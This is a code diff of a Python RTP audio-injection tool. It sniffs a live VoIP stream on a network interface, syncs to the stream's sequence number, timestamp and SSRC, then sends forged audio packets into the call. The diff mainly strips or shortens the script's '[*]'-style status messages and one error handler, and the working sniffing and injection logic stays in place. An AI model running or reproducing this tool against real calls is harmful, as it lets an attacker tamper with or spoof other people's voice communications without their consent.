@@ -23,8 +23,6 @@ PACKET_INTERVAL = PACKET_DURATION_MS / 1000.0
 
 
 def get_stream_params():
-    print(f"[*] Sniffing for audio stream parameters on {IFACE}...")
-    print(f"[*] Collecting multiple packets for stable sync...")
 
     audio_packets = []
     attempts = 0
@@ -54,17 +52,17 @@ def get_stream_params():
         # Check for Audio (PCMU=0, PCMA=8)
         if pt == 8 or pt == 0:
             audio_packets.append(pkt)
-            print(f"[*] Captured audio packet {len(audio_packets)}/5...")
+            print(f"Captured audio packet")
 
     if not audio_packets:
-        print("[!] Failed to capture audio packets!")
+        print("Failed to capture audio packets")
         return INIT_SEQ_NUM, 0, SSRC_INJECTED, PAYLOAD_TYPE, 0, 0
 
     pkt = audio_packets[-1]
 
     if RTP in pkt:
         rtp = pkt[RTP]
-        print(f"[+] Synced to AUDIO! Seq={rtp.sequence}, TS={rtp.timestamp}, SSRC={hex(rtp.sourcesync)}, PT={rtp.payload_type}")
+        print(f"Synced, Seq={rtp.sequence}, TS={rtp.timestamp}, SSRC={hex(rtp.sourcesync)}, PT={rtp.payload_type}")
         return rtp.sequence + 10, rtp.timestamp + (TIMESTAMP_INC * 10), rtp.sourcesync, rtp.payload_type, pkt[UDP].sport, pkt[UDP].dport
     else:
         udp_payload = bytes(pkt[UDP].payload)
@@ -73,30 +71,24 @@ def get_stream_params():
         ts = header[2]
         ssrc = header[3]
         pt = udp_payload[1] & 0x7F
-        print(f"[+] Synced to AUDIO! Seq={seq}, TS={ts}, SSRC={hex(ssrc)}, PT={pt}")
+        print(f"Synced, Seq={seq}, TS={ts}, SSRC={hex(ssrc)}, PT={pt}")
         return seq + 10, ts + (TIMESTAMP_INC * 10), ssrc, pt, pkt[UDP].sport, pkt[UDP].dport
 
 def inject_audio(audio_file):
     sequence_num, timestamp, ssrc, payload_type, sport, dport = get_stream_params()
 
     if sport == 0 or dport == 0:
-        print("[!] Failed to get stream parameters. Aborting.")
         return
 
-    print(f"[*] Waiting {AUDIO_START_DELAY}s before injection...")
-    time.sleep(AUDIO_START_DELAY)
+   
+    time.sleep(AUDIO_START_DELAY) # manual sync attempt
 
-    print(f"[*] Starting AUDIO injection on {IFACE} -> SrcPort:{sport} DstPort:{dport}...")
-    print(f"[*] Stream params: SSRC={hex(ssrc)}, PT={payload_type}")
 
     try:
         with open(audio_file, 'rb') as f:
             raw_audio = f.read()
 
         chunks = [raw_audio[i:i + SAMPLES_PER_PACKET] for i in range(0, len(raw_audio), SAMPLES_PER_PACKET)]
-
-        print(f"[*] Injecting {len(chunks)} audio packets ({len(raw_audio)} bytes)...")
-        print(f"[*] Duration: ~{len(chunks) * PACKET_DURATION_MS / 1000:.1f} seconds")
 
         start_time = time.time()
 
@@ -134,16 +126,13 @@ def inject_audio(audio_file):
             if sleep_time > 0:
                 time.sleep(sleep_time)
 
-    except FileNotFoundError:
-        print(f"[!] Audio file not found: {audio_file}")
     except Exception as e:
-        print(f"[!] Audio Injection failed: {e}")
+        print(f"Audio Injection failed: {e}")
         import traceback
         traceback.print_exc()
     finally:
-        elapsed = time.time() - start_time
-        print(f"\n[+] Audio Injection finished in {elapsed:.1f}s")
-        print(f"[+] Sent {len(chunks)} packets")
+        print(f"\nAudio Injection finished")
+
 
 if __name__ == "__main__":
     
